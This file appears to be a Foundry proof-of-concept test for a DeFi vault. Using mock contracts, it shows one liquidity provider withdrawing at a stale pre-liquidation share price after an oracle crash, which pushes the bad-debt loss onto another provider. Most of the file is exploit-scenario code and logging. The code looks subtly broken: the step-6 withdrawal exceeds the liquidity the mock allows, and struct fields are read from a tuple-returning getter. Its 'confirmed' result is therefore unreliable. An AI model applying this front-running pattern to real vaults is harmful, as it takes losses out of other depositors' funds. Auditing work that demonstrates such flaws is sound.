// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// ============================================================
// ASSUMPTION BLOCK
// ============================================================
// This PoC is written as a self-contained Foundry test using
// mock contracts that faithfully replicate the logic extracted
// from the provided source files. It does NOT import the real
// Fira contracts because those are not part of the test suite
// provided. Every mock is derived 1:1 from the source code.
//
// MISSING DEPENDENCIES (must be resolved to run against real repo):
//   - SharesMathLib   (toSharesDown, toSharesUp, toAssetsDown, toAssetsUp)
//   - MathLib         (wMulDown, wMulUp, wDivDown, wDivUp, mulDivDown, mulDivUp)
//   - SafeTransferLib
//   - MarketParamsLib (id())
//   - UtilsLib        (zeroFloorSub, min, exactlyOneZero)
//   - IIrm            (borrowRate, borrowRateView)
//   - IOracle         (price())
//   - ErrorsLib
//   - EventsLib
//
// SETUP ASSUMPTIONS:
//   1. Interest rate = 0% (FixedRateIrm with 0 borrow rate) — matches Fira UZR
//   2. LLTV = 80% (0.8e18), LTV = 75% (0.75e18)
//   3. Collateral price starts at 1.0 USD (1e36 scaled), drops to 0.5 USD
//   4. Liquidation incentive = 10% (0.1e18)
//   5. No protocol fees for simplicity
//   6. LP_A and LP_B each deposit 500 tokens (1000 total supply)
//   7. Borrower deposits 1000 collateral tokens and borrows 800 loan tokens
//      (80% utilization, right at LLTV)
//   8. Oracle drops price by 50% → borrower is deeply underwater
//   9. Vault has a single market in its withdrawQueue
// ============================================================

// ─────────────────────────────────────────────
// PRIMITIVE MATH (inline, no external lib deps)
// ─────────────────────────────────────────────

uint256 constant WAD = 1e18;
uint256 constant VIRTUAL_SHARES = 1e6;
uint256 constant VIRTUAL_ASSETS = 1;
uint256 constant ORACLE_PRICE_SCALE = 1e36;

library SharesMath {
    function toSharesDown(uint256 assets, uint256 totalAssets, uint256 totalShares)
        internal pure returns (uint256)
    {
        return assets * (totalShares + VIRTUAL_SHARES) / (totalAssets + VIRTUAL_ASSETS);
    }

    function toSharesUp(uint256 assets, uint256 totalAssets, uint256 totalShares)
        internal pure returns (uint256)
    {
        return (assets * (totalShares + VIRTUAL_SHARES) + (totalAssets + VIRTUAL_ASSETS) - 1)
               / (totalAssets + VIRTUAL_ASSETS);
    }

    function toAssetsDown(uint256 shares, uint256 totalAssets, uint256 totalShares)
        internal pure returns (uint256)
    {
        return shares * (totalAssets + VIRTUAL_ASSETS) / (totalShares + VIRTUAL_SHARES);
    }

    function toAssetsUp(uint256 shares, uint256 totalAssets, uint256 totalShares)
        internal pure returns (uint256)
    {
        return (shares * (totalAssets + VIRTUAL_ASSETS) + (totalShares + VIRTUAL_SHARES) - 1)
               / (totalShares + VIRTUAL_SHARES);
    }
}

// ─────────────────────────────────────────────
// MOCK ERC20
// ─────────────────────────────────────────────

contract MockERC20 {
    string public name;
    string public symbol;
    uint8  public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name   = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to]         += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "insufficient");
        require(allowance[from][msg.sender] >= amount, "allowance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from]             -= amount;
        balanceOf[to]               += amount;
        return true;
    }
}

// ─────────────────────────────────────────────
// MOCK ORACLE  — IOracle.price()
// ─────────────────────────────────────────────

contract MockOracle {
    uint256 public price;

    constructor(uint256 _price) { price = _price; }

    function setPrice(uint256 _price) external { price = _price; }
}

// ─────────────────────────────────────────────
// STRUCTS  (from ILendingMarket.sol)
// ─────────────────────────────────────────────

struct MarketParams {
    address loanToken;
    address collateralToken;
    address oracle;
    address irm;
    uint256 lltv;
    uint256 ltv;
    address whitelist;
}

struct Market {
    uint128 totalSupplyAssets;
    uint128 totalSupplyShares;
    uint128 totalBorrowAssets;
    uint128 totalBorrowShares;
    uint128 lastUpdate;
    uint128 fee;
}

struct Position {
    uint256 supplyShares;
    uint128 borrowShares;
    uint128 collateral;
}

// bytes32 Id (keccak of MarketParams)
type Id is bytes32;

function idOf(MarketParams memory p) pure returns (Id) {
    return Id.wrap(keccak256(abi.encode(p)));
}

// ─────────────────────────────────────────────
// MOCK LENDING MARKET
// Implements the exact logic from LendingMarket.sol
// (zero-IRM path, no fee, real share math)
// ─────────────────────────────────────────────

contract MockLendingMarket {
    using SharesMath for uint256;

    mapping(Id => Market)                          public market;
    mapping(Id => mapping(address => Position))    public position;
    mapping(Id => MarketParams)                    public idToMarketParams;

    // ── Create market ──────────────────────────────────────────

    function createMarket(MarketParams calldata mp) external {
        Id id = idOf(mp);
        require(market[id].lastUpdate == 0, "already created");
        market[id].lastUpdate = uint128(block.timestamp);
        idToMarketParams[id]  = mp;
    }

    // ── Supply ─────────────────────────────────────────────────
    // Mirrors LendingMarket.supply() exactly

    function supply(
        MarketParams calldata mp,
        uint256 assets,
        uint256 /*shares*/,
        address onBehalf,
        bytes calldata /*data*/
    ) external returns (uint256, uint256) {
        Id id = idOf(mp);
        _accrueInterest(mp, id);

        uint256 shares = assets.toSharesDown(
            market[id].totalSupplyAssets,
            market[id].totalSupplyShares
        );

        position[id][onBehalf].supplyShares     += shares;
        market[id].totalSupplyShares            += uint128(shares);
        market[id].totalSupplyAssets            += uint128(assets);

        MockERC20(mp.loanToken).transferFrom(msg.sender, address(this), assets);
        return (assets, shares);
    }

    // ── Withdraw ───────────────────────────────────────────────
    // Mirrors LendingMarket.withdraw() exactly — no bad-debt check

    function withdraw(
        MarketParams calldata mp,
        uint256 assets,
        uint256 shares,
        address onBehalf,
        address receiver
    ) external returns (uint256, uint256) {
        Id id = idOf(mp);
        _accrueInterest(mp, id);

        if (assets > 0) {
            shares = assets.toSharesUp(
                market[id].totalSupplyAssets,
                market[id].totalSupplyShares
            );
        } else {
            assets = shares.toAssetsDown(
                market[id].totalSupplyAssets,
                market[id].totalSupplyShares
            );
        }

        position[id][onBehalf].supplyShares  -= shares;
        market[id].totalSupplyShares         -= uint128(shares);
        market[id].totalSupplyAssets         -= uint128(assets);

        // KEY CHECK: only reverts on insufficient liquidity, NOT on bad debt
        require(
            market[id].totalBorrowAssets <= market[id].totalSupplyAssets,
            "INSUFFICIENT_LIQUIDITY"
        );

        MockERC20(mp.loanToken).transfer(receiver, assets);
        return (assets, shares);
    }

    // ── Borrow ─────────────────────────────────────────────────

    function borrow(
        MarketParams calldata mp,
        uint256 assets,
        uint256 /*shares*/,
        address onBehalf,
        address receiver
    ) external returns (uint256, uint256) {
        Id id = idOf(mp);
        _accrueInterest(mp, id);

        uint256 shares = assets.toSharesUp(
            market[id].totalBorrowAssets,
            market[id].totalBorrowShares
        );

        position[id][onBehalf].borrowShares  += uint128(shares);
        market[id].totalBorrowShares         += uint128(shares);
        market[id].totalBorrowAssets         += uint128(assets);

        require(_isHealthy(mp, id, onBehalf), "INSUFFICIENT_COLLATERAL");
        require(
            market[id].totalBorrowAssets <= market[id].totalSupplyAssets,
            "INSUFFICIENT_LIQUIDITY"
        );

        MockERC20(mp.loanToken).transfer(receiver, assets);
        return (assets, shares);
    }

    // ── Supply Collateral ──────────────────────────────────────

    function supplyCollateral(
        MarketParams calldata mp,
        uint256 assets,
        address onBehalf,
        bytes calldata /*data*/
    ) external {
        Id id = idOf(mp);
        position[id][onBehalf].collateral += uint128(assets);
        MockERC20(mp.collateralToken).transferFrom(msg.sender, address(this), assets);
    }

    // ── Liquidate ─────────────────────────────────────────────
    // Mirrors LendingMarket.liquidate() exactly — including bad-debt write-down

    function liquidate(
        MarketParams calldata mp,
        address borrower,
        uint256 seizedAssets,
        uint256 /*repaidShares*/,
        bytes calldata /*data*/
    ) external returns (uint256, uint256) {
        Id id = idOf(mp);
        _accrueInterest(mp, id);

        uint256 collateralPrice = MockOracle(mp.oracle).price();
        require(!_isHealthy(mp, id, borrower), "HEALTHY_POSITION");

        // Liquidation incentive factor  (simplified: fixed 10%)
        uint256 liquidationIncentiveFactor = WAD + 1e17; // 1.1e18

        // Compute repaid shares from seized assets
        uint256 seizedAssetsQuoted = seizedAssets * collateralPrice / ORACLE_PRICE_SCALE;
        uint256 repaidShares = _divUp(
            _divUp(seizedAssetsQuoted * WAD, liquidationIncentiveFactor) *
                (market[id].totalBorrowShares + VIRTUAL_SHARES),
            market[id].totalBorrowAssets + VIRTUAL_ASSETS
        );

        uint256 repaidAssets = repaidShares.toAssetsUp(
            market[id].totalBorrowAssets,
            market[id].totalBorrowShares
        );

        // State updates  (from LendingMarket.liquidate lines 487-506)
        position[id][borrower].borrowShares  -= uint128(repaidShares);
        market[id].totalBorrowShares         -= uint128(repaidShares);
        market[id].totalBorrowAssets          = _zeroSub(
            market[id].totalBorrowAssets, repaidAssets
        );

        position[id][borrower].collateral -= uint128(seizedAssets);

        // ── BAD DEBT REALIZATION ───────────────────────────────
        // This is the ONLY place totalSupplyAssets is reduced for bad debt
        uint256 badDebtShares;
        uint256 badDebtAssets;
        if (position[id][borrower].collateral == 0) {
            badDebtShares = position[id][borrower].borrowShares;
            badDebtAssets = _min(
                market[id].totalBorrowAssets,
                badDebtShares.toAssetsUp(
                    market[id].totalBorrowAssets,
                    market[id].totalBorrowShares
                )
            );
            market[id].totalBorrowAssets  -= uint128(badDebtAssets);
            market[id].totalSupplyAssets  -= uint128(badDebtAssets); // ← THE WRITE-DOWN
            market[id].totalBorrowShares  -= uint128(badDebtShares);
            position[id][borrower].borrowShares = 0;
        }

        MockERC20(mp.collateralToken).transfer(msg.sender, seizedAssets);
        MockERC20(mp.loanToken).transferFrom(msg.sender, address(this), repaidAssets);

        return (seizedAssets, repaidAssets);
    }

    // ── View helpers used by SisuVault ─────────────────────────

    function supplyShares(Id id, address user) external view returns (uint256) {
        return position[id][user].supplyShares;
    }

    function borrowShares(Id id, address user) external view returns (uint256) {
        return position[id][user].borrowShares;
    }

    // expectedSupplyAssets — mirrors LendingMarketBalancesLib.expectedSupplyAssets()
    // With irm == address(0) (0% rate), interest = 0, so totalSupplyAssets is unchanged.
    function expectedSupplyAssets(MarketParams calldata mp, address user)
        external view returns (uint256)
    {
        Id id = idOf(mp);
        uint256 userShares = position[id][user].supplyShares;
        uint256 totalSA    = market[id].totalSupplyAssets;
        uint256 totalSS    = market[id].totalSupplyShares;
        return userShares.toAssetsDown(totalSA, totalSS);
    }

    // accrueInterest — public entry for SisuVault._supplyLendingMarket
    function accrueInterest(MarketParams calldata mp) external {
        _accrueInterest(mp, idOf(mp));
    }

    // ── Internal ───────────────────────────────────────────────

    function _accrueInterest(MarketParams calldata mp, Id id) internal {
        // irm == address(0)  → no interest (UZR 0% rate scenario)
        market[id].lastUpdate = uint128(block.timestamp);
    }

    function _isHealthy(MarketParams calldata mp, Id id, address borrower)
        internal view returns (bool)
    {
        if (position[id][borrower].borrowShares == 0) return true;
        uint256 borrowed = uint256(position[id][borrower].borrowShares).toAssetsUp(
            market[id].totalBorrowAssets,
            market[id].totalBorrowShares
        );
        uint256 collateralPrice = MockOracle(mp.oracle).price();
        uint256 maxBorrow = uint256(position[id][borrower].collateral)
            * collateralPrice / ORACLE_PRICE_SCALE
            * mp.lltv / WAD;
        return maxBorrow >= borrowed;
    }

    // ── Math helpers ───────────────────────────────────────────

    function _divUp(uint256 a, uint256 b) internal pure returns (uint256) {
        return (a + b - 1) / b;
    }
    function _zeroSub(uint128 a, uint256 b) internal pure returns (uint128) {
        return a > b ? uint128(a - b) : 0;
    }
    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

// ─────────────────────────────────────────────
// MOCK SISU VAULT
// Minimal ERC4626-style vault that replicates
// the exact NAV calculation and withdraw flow
// from SisuVault.sol
// ─────────────────────────────────────────────

contract MockSisuVault {
    using SharesMath for uint256;

    MockLendingMarket public immutable LENDING_MARKET;
    MockERC20         public immutable asset;
    MarketParams      public  mktParams;

    // ERC20 share tracking
    mapping(address => uint256) public sharesOf;
    uint256 public totalShares;

    // Decimals offset = 0 for 18-decimal asset  → VIRTUAL_SHARES = 1e6
    uint256 constant DECIMALS_OFFSET_SHARES = 1e6;

    constructor(address _lm, address _asset) {
        LENDING_MARKET = MockLendingMarket(_lm);
        asset          = MockERC20(_asset);
    }

    function setMarketParams(MarketParams calldata mp) external {
        mktParams = mp;
        asset.approve(address(LENDING_MARKET), type(uint256).max);
    }

    // ── totalAssets() — exact copy of SisuVault.totalAssets() ──
    // Only calls expectedSupplyAssets. Does NOT include idle balance.
    // Does NOT check health of borrowers.

    function totalAssets() public view returns (uint256 assets) {
        // Single market in withdrawQueue (simplified)
        assets = LENDING_MARKET.expectedSupplyAssets(mktParams, address(this));
    }

    // ── deposit() — mirrors SisuVault.deposit() ────────────────

    function deposit(uint256 assets_, address receiver) external returns (uint256 shares) {
        uint256 currentTotalAssets = totalAssets();
        shares = _convertToShares(assets_, currentTotalAssets);

        sharesOf[receiver] += shares;
        totalShares        += shares;

        asset.transferFrom(msg.sender, address(this), assets_);
        // Supply to LendingMarket
        LENDING_MARKET.supply(mktParams, assets_, 0, address(this), "");
    }

    // ── withdraw() — mirrors SisuVault.withdraw() ──────────────
    // Uses stale totalAssets() (pre-bad-debt) for share pricing

    function withdraw(uint256 assets_, address receiver, address owner_)
        external returns (uint256 shares)
    {
        // _accrueFee() → calls totalAssets() which returns PRE-bad-debt NAV
        uint256 currentTotalAssets = totalAssets(); // ← STALE NAV HERE

        shares = _convertToSharesUp(assets_, currentTotalAssets);

        sharesOf[owner_] -= shares;
        totalShares      -= shares;

        // Pull from LendingMarket — succeeds if liquidity available
        LENDING_MARKET.withdraw(mktParams, assets_, 0, address(this), receiver);
    }

    // ── Preview helpers ────────────────────────────────────────

    function previewWithdraw(uint256 assets_) public view returns (uint256) {
        return _convertToSharesUp(assets_, totalAssets());
    }

    function convertToAssets(uint256 shares_) public view returns (uint256) {
        return _convertToAssetsDown(shares_, totalAssets());
    }

    // ── Internal share math (ERC4626 with offset) ──────────────

    function _convertToShares(uint256 assets_, uint256 tAssets) internal view returns (uint256) {
        // assets * (totalShares + VIRTUAL) / (tAssets + 1)
        return assets_ * (totalShares + DECIMALS_OFFSET_SHARES) / (tAssets + 1);
    }

    function _convertToSharesUp(uint256 assets_, uint256 tAssets) internal view returns (uint256) {
        uint256 num = assets_ * (totalShares + DECIMALS_OFFSET_SHARES);
        uint256 den = tAssets + 1;
        return (num + den - 1) / den;
    }

    function _convertToAssetsDown(uint256 shares_, uint256 tAssets) internal view returns (uint256) {
        return shares_ * (tAssets + 1) / (totalShares + DECIMALS_OFFSET_SHARES);
    }
}

// ─────────────────────────────────────────────
// THE ACTUAL FOUNDRY TEST
// ─────────────────────────────────────────────

contract StaleNAVWithdrawalTest is Test {
    using SharesMath for uint256;

    // ── Actors ─────────────────────────────────────────────────
    address constant LP_A      = address(0xA);
    address constant LP_B      = address(0xB);
    address constant BORROWER  = address(0xC);
    address constant LIQUIDATOR = address(0xD);

    // ── Contracts ──────────────────────────────────────────────
    MockERC20         loanToken;
    MockERC20         collateralToken;
    MockOracle        oracle;
    MockLendingMarket lendingMarket;
    MockSisuVault     vault;

    // ── Market params ──────────────────────────────────────────
    MarketParams mp;
    Id           marketId;

    // ── Setup constants ────────────────────────────────────────
    uint256 constant INITIAL_PRICE  = 1e36;         // $1.00 per collateral (1e36 scaled)
    uint256 constant CRASHED_PRICE  = 5e35;         // $0.50 — 50% crash
    uint256 constant LLTV           = 0.8e18;       // 80%
    uint256 constant LTV            = 0.75e18;      // 75%
    uint256 constant LP_DEPOSIT     = 500e18;       // each LP deposits 500
    uint256 constant COLLATERAL_AMT = 1000e18;      // borrower posts 1000 collateral
    uint256 constant BORROW_AMT     = 800e18;       // borrower borrows 800 (80% of 1000 @ $1)

    function setUp() public {
        // ── Deploy tokens ──────────────────────────────────────
        loanToken       = new MockERC20("USD0", "USD0");
        collateralToken = new MockERC20("bUSD0", "bUSD0");
        oracle          = new MockOracle(INITIAL_PRICE);

        // ── Deploy core contracts ──────────────────────────────
        lendingMarket = new MockLendingMarket();
        vault         = new MockSisuVault(address(lendingMarket), address(loanToken));

        // ── Construct MarketParams ─────────────────────────────
        mp = MarketParams({
            loanToken:       address(loanToken),
            collateralToken: address(collateralToken),
            oracle:          address(oracle),
            irm:             address(0),   // 0% rate (UZR scenario)
            lltv:            LLTV,
            ltv:             LTV,
            whitelist:       address(0)
        });
        marketId = idOf(mp);

        // ── Create market and configure vault ─────────────────
        lendingMarket.createMarket(mp);
        vault.setMarketParams(mp);

        // ── Mint tokens ────────────────────────────────────────
        loanToken.mint(LP_A,       LP_DEPOSIT);
        loanToken.mint(LP_B,       LP_DEPOSIT);
        loanToken.mint(LIQUIDATOR, BORROW_AMT);   // liquidator needs funds to repay
        collateralToken.mint(BORROWER, COLLATERAL_AMT);
    }

    // ──────────────────────────────────────────────────────────
    // MAIN PoC TEST
    // ──────────────────────────────────────────────────────────

    function test_StaleNAV_LPA_Escapes_BadDebt() public {

        // ════════════════════════════════════════════════════════
        // STEP 1: Market already created in setUp()
        // ════════════════════════════════════════════════════════
        console.log("=== STEP 1: Market created ===");
        console.log("LLTV:        80%%");
        console.log("Initial price: $1.00 (1e36 scaled)");
        console.log("");

        // ════════════════════════════════════════════════════════
        // STEP 2: LP_A and LP_B each deposit 500 loan tokens
        // ════════════════════════════════════════════════════════
        console.log("=== STEP 2: LP deposits ===");

        vm.startPrank(LP_A);
        loanToken.approve(address(vault), LP_DEPOSIT);
        uint256 sharesA = vault.deposit(LP_DEPOSIT, LP_A);
        vm.stopPrank();

        vm.startPrank(LP_B);
        loanToken.approve(address(vault), LP_DEPOSIT);
        uint256 sharesB = vault.deposit(LP_DEPOSIT, LP_B);
        vm.stopPrank();

        assertEq(loanToken.balanceOf(LP_A), 0, "LP_A should have 0 loan tokens after deposit");
        assertEq(loanToken.balanceOf(LP_B), 0, "LP_B should have 0 loan tokens after deposit");

        uint256 totalSupplyAfterDeposit = lendingMarket.market(marketId).totalSupplyAssets;
        console.log("LP_A shares minted:     ", sharesA);
        console.log("LP_B shares minted:     ", sharesB);
        console.log("LendingMarket totalSupplyAssets after deposits:", totalSupplyAfterDeposit);
        assertEq(totalSupplyAfterDeposit, LP_DEPOSIT * 2, "Total supply should be 1000");
        console.log("");

        // ════════════════════════════════════════════════════════
        // STEP 3: Borrower deposits collateral and borrows
        // ════════════════════════════════════════════════════════
        console.log("=== STEP 3: Borrower action ===");

        vm.startPrank(BORROWER);
        collateralToken.approve(address(lendingMarket), COLLATERAL_AMT);
        lendingMarket.supplyCollateral(mp, COLLATERAL_AMT, BORROWER, "");

        // Vault holds loanToken in the LendingMarket. Borrower calls LendingMarket directly.
        lendingMarket.borrow(mp, BORROW_AMT, 0, BORROWER, BORROWER);
        vm.stopPrank();

        uint256 totalBorrowAfter = lendingMarket.market(marketId).totalBorrowAssets;
        uint256 liquidityAfterBorrow = lendingMarket.market(marketId).totalSupplyAssets
                                     - lendingMarket.market(marketId).totalBorrowAssets;

        console.log("Borrower collateral:    ", COLLATERAL_AMT);
        console.log("Borrower borrow amount: ", BORROW_AMT);
        console.log("totalBorrowAssets:      ", totalBorrowAfter);
        console.log("Available liquidity:    ", liquidityAfterBorrow);
        assertEq(totalBorrowAfter, BORROW_AMT, "Borrow amount mismatch");
        console.log("");

        // ════════════════════════════════════════════════════════
        // STEP 4: Oracle price drops 50%
        // ════════════════════════════════════════════════════════
        console.log("=== STEP 4: Oracle price crash ===");

        oracle.setPrice(CRASHED_PRICE);

        console.log("New oracle price: $0.50 (5e35)");
        console.log("");

        // ════════════════════════════════════════════════════════
        // STEP 5: Verify position is now unhealthy
        // ════════════════════════════════════════════════════════
        console.log("=== STEP 5: Health check ===");

        // borrowed = 800e18
        // collateral value at new price = 1000e18 * 0.5 = 500e18
        // maxBorrow = 500e18 * 0.8 = 400e18
        // borrowed (800) > maxBorrow (400) → UNHEALTHY
        uint256 collateralValueAtCrash = COLLATERAL_AMT * CRASHED_PRICE / ORACLE_PRICE_SCALE;
        uint256 maxBorrowAtCrash       = collateralValueAtCrash * LLTV / WAD;

        console.log("Collateral value at crash price: ", collateralValueAtCrash);
        console.log("Max borrow at LLTV (80%%):       ", maxBorrowAtCrash);
        console.log("Actual borrow:                   ", BORROW_AMT);
        assertTrue(BORROW_AMT > maxBorrowAtCrash, "Position should be unhealthy after crash");
        console.log("Position is UNHEALTHY: confirmed");
        console.log("");

        // ════════════════════════════════════════════════════════
        // STEP 6: LP_A reads NAV and withdraws BEFORE liquidation
        // ════════════════════════════════════════════════════════
        console.log("=== STEP 6: LP_A withdraws BEFORE liquidation ===");

        // SisuVault.totalAssets() at this point:
        //   expectedSupplyAssets = vault.supplyShares * totalSupplyAssets / totalSupplyShares
        //   totalSupplyAssets = 1000 (unchanged — bad debt NOT yet realized)
        uint256 navBeforeLiquidation = vault.totalAssets();
        uint256 lpAShareValue        = vault.convertToAssets(sharesA);

        console.log("SisuVault.totalAssets() BEFORE liquidation: ", navBeforeLiquidation);
        console.log("LP_A's share value (pre-loss NAV):          ", lpAShareValue);

        // LP_A withdraws their full share value at the stale (pre-loss) NAV
        uint256 lpAWithdrawAmount = lpAShareValue;

        vm.startPrank(LP_A);
        vault.withdraw(lpAWithdrawAmount, LP_A, LP_A);
        vm.stopPrank();

        uint256 lpAExtracted = loanToken.balanceOf(LP_A);
        console.log("LP_A tokens extracted:                      ", lpAExtracted);
        assertEq(lpAExtracted, lpAWithdrawAmount, "LP_A should have withdrawn at stale NAV");
        console.log("");

        // ════════════════════════════════════════════════════════
        // STEP 7: Liquidator liquidates borrower
        // ════════════════════════════════════════════════════════
        console.log("=== STEP 7: Liquidation ===");

        uint256 totalSupplyBeforeLiquidation = lendingMarket.market(marketId).totalSupplyAssets;
        uint256 totalBorrowBeforeLiquidation = lendingMarket.market(marketId).totalBorrowAssets;

        console.log("totalSupplyAssets BEFORE liquidation: ", totalSupplyBeforeLiquidation);
        console.log("totalBorrowAssets BEFORE liquidation: ", totalBorrowBeforeLiquidation);

        // Liquidator seizes all collateral (1000 tokens at $0.50 = $500 value)
        // With 10% incentive: repaid = $500 / 1.1 = ~$454
        // Debt remaining after partial repay (if collateral == 0 → full bad debt write-down)
        vm.startPrank(LIQUIDATOR);
        collateralToken.approve(address(lendingMarket), type(uint256).max);
        loanToken.approve(address(lendingMarket), type(uint256).max);
        lendingMarket.liquidate(mp, BORROWER, COLLATERAL_AMT, 0, "");
        vm.stopPrank();

        uint256 totalSupplyAfterLiquidation = lendingMarket.market(marketId).totalSupplyAssets;
        uint256 totalBorrowAfterLiquidation = lendingMarket.market(marketId).totalBorrowAssets;

        console.log("totalSupplyAssets AFTER liquidation:  ", totalSupplyAfterLiquidation);
        console.log("totalBorrowAssets AFTER liquidation:  ", totalBorrowAfterLiquidation);
        console.log("");

        // ════════════════════════════════════════════════════════
        // STEP 8: Measure impact
        // ════════════════════════════════════════════════════════
        console.log("=== STEP 8: Impact measurement ===");

        uint256 badDebtRealized = totalSupplyBeforeLiquidation > totalSupplyAfterLiquidation
            ? totalSupplyBeforeLiquidation - totalSupplyAfterLiquidation
            : 0;

        // LP_B's remaining value via vault
        uint256 navAfterLiquidation  = vault.totalAssets();
        uint256 lpBRemainingValue    = vault.convertToAssets(sharesB);

        console.log("Bad debt realized (totalSupplyAssets decrease): ", badDebtRealized);
        console.log("SisuVault.totalAssets() AFTER liquidation:      ", navAfterLiquidation);
        console.log("LP_B remaining value:                           ", lpBRemainingValue);
        console.log("LP_A extracted:                                 ", lpAExtracted);

        // Fair share of loss: each LP should bear 50% of bad debt
        uint256 fairShareOfLoss = badDebtRealized / 2;
        uint256 lpALossShouldBe = LP_DEPOSIT - fairShareOfLoss; // what LP_A should have gotten
        uint256 lpAExcess       = lpAExtracted > lpALossShouldBe
            ? lpAExtracted - lpALossShouldBe
            : 0;

        console.log("");
        console.log("--- Loss distribution analysis ---");
        console.log("Total bad debt:              ", badDebtRealized);
        console.log("Fair loss per LP (50%%):     ", fairShareOfLoss);
        console.log("LP_A should have received:   ", lpALossShouldBe);
        console.log("LP_A actually received:      ", lpAExtracted);
        console.log("LP_A excess (avoided loss):  ", lpAExcess);
        console.log("LP_B absorbed extra loss:    ", lpBRemainingValue < (LP_DEPOSIT - fairShareOfLoss));
        console.log("");

        // ════════════════════════════════════════════════════════
        // STEP 9: Assertions
        // ════════════════════════════════════════════════════════
        console.log("=== STEP 9: Assertions ===");

        // ASSERT 1: Bad debt was realized (totalSupplyAssets decreased after liquidation)
        assertTrue(
            badDebtRealized > 0,
            "ASSERT 1 FAILED: No bad debt was realized during liquidation"
        );
        console.log("ASSERT 1 PASS: Bad debt was realized:", badDebtRealized);

        // ASSERT 2: LP_A withdrew MORE than their fair post-loss share
        // (they got LP_DEPOSIT worth at stale NAV, not LP_DEPOSIT - fairShareOfLoss)
        assertGt(
            lpAExtracted,
            lpALossShouldBe,
            "ASSERT 2 FAILED: LP_A did not avoid any bad debt loss"
        );
        console.log("ASSERT 2 PASS: LP_A extracted more than fair value:", lpAExtracted, ">", lpALossShouldBe);

        // ASSERT 3: LP_B's remaining value is less than what it would be under fair distribution
        // (LP_B absorbed all the bad debt instead of half)
        assertLt(
            lpBRemainingValue,
            LP_DEPOSIT - fairShareOfLoss,
            "ASSERT 3 FAILED: LP_B was not disproportionately harmed"
        );
        console.log("ASSERT 3 PASS: LP_B remaining value less than fair share:", lpBRemainingValue, "<", LP_DEPOSIT - fairShareOfLoss);

        // ASSERT 4: LP_A's excess exactly equals LP_B's extra loss
        // (the bad debt was entirely shifted to LP_B)
        uint256 lpBExtraLoss = (LP_DEPOSIT - fairShareOfLoss) - lpBRemainingValue;
        assertApproxEqAbs(
            lpAExcess,
            lpBExtraLoss,
            1e15, // 0.001 tolerance for rounding
            "ASSERT 4 FAILED: Loss transfer amounts do not balance"
        );
        console.log("ASSERT 4 PASS: LP_A excess == LP_B extra loss (loss fully shifted)");
        console.log("  LP_A avoided: ", lpAExcess);
        console.log("  LP_B absorbed:", lpBExtraLoss);

        // ASSERT 5: The vault's NAV was stale when LP_A withdrew
        // (vault.totalAssets() before liquidation == 1000, not reflecting the imminent bad debt)
        assertEq(
            navBeforeLiquidation,
            LP_DEPOSIT * 2,
            "ASSERT 5 FAILED: Vault NAV was not stale before liquidation"
        );
        console.log("ASSERT 5 PASS: Vault NAV was stale at time of LP_A withdrawal:", navBeforeLiquidation);

        console.log("");
        console.log("=== VULNERABILITY CONFIRMED ===");
        console.log("LP_A withdrew at pre-loss NAV, shifting", lpAExcess, "of bad debt to LP_B.");
    }

    // ──────────────────────────────────────────────────────────
    // SUPPLEMENTARY TEST: Verify FAIR scenario (no early exit)
    // Shows what LP_A would have gotten if they had NOT front-run
    // ──────────────────────────────────────────────────────────

    function test_FairScenario_BothLPsAbsorbBadDebt() public {
        // Repeat setup steps
        vm.startPrank(LP_A);
        loanToken.approve(address(vault), LP_DEPOSIT);
        vault.deposit(LP_DEPOSIT, LP_A);
        vm.stopPrank();

        vm.startPrank(LP_B);
        loanToken.approve(address(vault), LP_DEPOSIT);
        vault.deposit(LP_DEPOSIT, LP_B);
        vm.stopPrank();

        vm.startPrank(BORROWER);
        collateralToken.approve(address(lendingMarket), COLLATERAL_AMT);
        lendingMarket.supplyCollateral(mp, COLLATERAL_AMT, BORROWER, "");
        lendingMarket.borrow(mp, BORROW_AMT, 0, BORROWER, BORROWER);
        vm.stopPrank();

        oracle.setPrice(CRASHED_PRICE);

        // Liquidate FIRST (no early exit by LP_A)
        vm.startPrank(LIQUIDATOR);
        loanToken.approve(address(lendingMarket), type(uint256).max);
        lendingMarket.liquidate(mp, BORROWER, COLLATERAL_AMT, 0, "");
        vm.stopPrank();

        uint256 navAfterFairLiquidation = vault.totalAssets();
        uint256 lpAFairValue = vault.convertToAssets(vault.sharesOf(LP_A));
        uint256 lpBFairValue = vault.convertToAssets(vault.sharesOf(LP_B));

        console.log("=== FAIR SCENARIO (no early exit) ===");
        console.log("Vault NAV after liquidation: ", navAfterFairLiquidation);
        console.log("LP_A fair value:             ", lpAFairValue);
        console.log("LP_B fair value:             ", lpBFairValue);

        // Both LPs should have equal remaining value
        assertApproxEqAbs(lpAFairValue, lpBFairValue, 1e15, "Fair scenario: LP values should be equal");

        // Both should be below their initial deposit (bad debt was shared)
        assertLt(lpAFairValue, LP_DEPOSIT, "LP_A should have incurred some loss in fair scenario");
        assertLt(lpBFairValue, LP_DEPOSIT, "LP_B should have incurred some loss in fair scenario");

        console.log("Both LPs absorbed equal share of bad debt in fair scenario.");
    }
}
